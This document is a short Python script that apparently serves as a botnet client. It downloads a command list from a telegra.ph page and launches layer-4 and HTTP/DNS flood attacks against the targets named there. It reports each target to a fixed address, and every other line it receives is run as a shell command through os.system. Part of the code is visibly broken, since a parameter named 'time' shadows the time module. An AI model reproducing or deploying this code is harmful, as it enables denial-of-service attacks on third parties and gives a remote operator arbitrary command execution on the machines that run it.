import os
import socket
import select
import requests
import dns.resolver
import time
import threading
import concurrent.futures

def send_tcp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.close()

def send_udp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b'ping', (ip, port))
    sock.close()

def send_http(ip):
    try:
        requests.get(f'http://{ip}', timeout=1)
    except requests.exceptions.RequestException:
        pass

def send_https(url):
    try:
        requests.get(url, timeout=1, verify=False)
    except requests.exceptions.RequestException:
        pass

def send_dns(url):
    try:
        dns.resolver.resolve(url, 'A')
    except dns.resolver.NoAnswer:
        pass

def send_response(ip, port, response):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.sendall(response.encode())
    sock.close()

def attack_l4(ip, port, time):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for _ in range(100):
            futures.append(executor.submit(send_tcp, ip, port))
            futures.append(executor.submit(send_udp, ip, port))
            futures.append(executor.submit(send_http, ip))
            futures.append(executor.submit(send_response, '192.168.1.100', 8080, f'IP: {ip} Port: {port}'))
        for future in concurrent.futures.as_completed(futures):
            future.result()
    time.sleep(time)

def attack_7(url, time):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for _ in range(100):
            futures.append(executor.submit(send_https, url))
            futures.append(executor.submit(send_dns, url))
            futures.append(executor.submit(send_response, '192.168.1.100', 8080, f'URL: {url}'))
        for future in concurrent.futures.as_completed(futures):
            future.result()
    time.sleep(time)

def execute_command(command):
    os.system(command)

def main():
    text = requests.get('https://telegra.ph/Bot-08-21-8').text
    lines = text.split('\n')
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for line in lines:
            if '@' in line:
                line = line.replace('@', '\n')
            if line.startswith('/l4'):
                ip, port, time = line.split()[1:]
                port = int(port)
                time = int(time)
                futures.append(executor.submit(attack_l4, ip, port, time))
            elif line.startswith('/7'):
                url, time = line.split()[1:]
                time = int(time)
                futures.append(executor.submit(attack_7, url, time))
            else:
                futures.append(executor.submit(execute_command, line))
        for future in concurrent.futures.as_completed(futures):
            future.result()

if __name__ == '__main__':
    main()
